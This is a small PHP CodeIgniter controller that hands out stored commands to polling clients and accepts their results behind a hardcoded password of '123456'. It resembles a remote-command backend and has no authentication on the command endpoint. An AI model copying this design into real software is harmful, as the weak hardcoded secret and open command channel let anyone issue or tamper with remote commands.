<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class Command extends CI_Controller {

	function __construct(){
		parent::__construct();
	}
        
    function index(){
        redirect(site_url('command/get_command'));
    }
    
    function get_command(){
        $this->load->model('client_command_model');
        $command = $this->client_command_model->get_command();
        echo $command;
    }
    
    function reply_command(){
        $password = $this->input->post('password');
        $result = $this->input->post('result');
        if($password != '123456'){
            echo 'password error';
            return -1;
        }
        else{
            $this->load->model('client_command_model');
            $action_result = $this->client_command_model->reply_command($result);
            echo ($action_result == 1) ? 'sucess' : 'database error';
            return $action_result;
        }
    }
}
?>